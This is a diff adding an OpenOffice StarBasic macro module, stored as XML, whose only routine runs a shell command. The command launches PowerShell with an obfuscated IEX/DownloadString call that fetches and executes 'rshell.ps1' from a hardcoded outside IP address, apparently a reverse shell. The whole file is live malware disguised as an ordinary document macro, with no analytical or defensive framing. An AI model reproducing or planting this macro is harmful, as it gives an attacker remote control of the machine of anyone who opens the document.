@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
+
+Sub Main
+    Shell(&quot;cmd /c powershell I&apos;&apos;E&apos;&apos;X(Ne&apos;&apos;w-Obj&apos;&apos;ect Net.WebClient).DownloadString(&apos;http://172.233.245.47/rshell.ps1&apos;)&quot;)
+End Sub
+</script:module>
